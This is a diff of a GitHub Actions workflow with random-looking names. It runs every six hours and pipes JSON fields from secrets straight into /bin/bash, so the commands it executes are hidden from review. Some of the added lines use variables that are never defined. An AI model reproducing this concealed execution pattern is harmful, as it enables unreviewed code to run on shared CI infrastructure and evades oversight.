@@ -1,9 +1,8 @@
 name: changyiwan8765
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 1/6 * * *'
+    - cron: '30 0/6 * * *'
 
 jobs:
   build:
@@ -12,16 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: changyiwan8765
         env:
-          an88: ${{ secrets.an88 }}
+          wqbwt45935: ${{ secrets.wqbwt45935 }}
         run: |
-          echo $an88 | jq -r .wj8556 | /bin/bash
-          echo $dzk3322 | jq -r .ca47 | /bin/bash
-          echo $fxjzg09375 | jq -r .bktz41 | /bin/bash
-          echo $ctmd35 | jq -r .fmyrm7 | /bin/bash
-          echo $z273 | jq -r .ex3374 | /bin/bash
-          echo $b26 | jq -r .uym34 | /bin/bash
-          echo $qnxyq03983 | jq -r .jmlt2412 | /bin/bash
-          echo $p01 | jq -r .a08 | /bin/bash
-          echo $n54941 | jq -r .june4 | /bin/bash
-          echo $ckdsm74 | jq -r .fpp5 | /bin/bash
+          echo $wqbwt45935 | jq -r .s4 | /bin/bash
+          echo $l5 | jq -r .ubkjg9 | /bin/bash
+          echo $sqzbn2502 | jq -r .kw60420 | /bin/bash
 
